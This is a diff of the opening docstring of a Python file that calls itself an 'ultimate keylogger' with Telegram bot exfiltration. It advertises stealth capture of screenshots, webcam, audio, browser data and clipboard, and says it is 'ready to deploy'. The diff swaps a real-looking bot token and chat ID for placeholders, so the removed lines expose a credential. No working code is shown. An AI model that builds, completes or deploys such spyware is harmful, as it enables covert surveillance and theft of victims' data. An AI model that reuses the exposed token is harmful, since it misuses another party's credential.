@@ -1,8 +1,8 @@
 #!/usr/bin/env python3
 """
 🌟 ULTIMATE KEYLOGGER v4.0 - FULL TELEGRAM BOT INTEGRATED
-BOT TOKEN: 8278433664:AAGPWIzULblBOabahplHTaFpEbWLnYCdPQM
-CHAT ID: 6091930481 ✓ ADDED!
+BOT TOKEN: PASTE_YOUR_BOT_TOKEN_HERE
+CHAT ID: PASTE_YOUR_CHAT_ID_HERE ✓ ADDED!
 Complete Surveillance | Screenshots | Webcam | Audio | Browser | Clipboard | Stealth
 READY TO DEPLOY!
 """
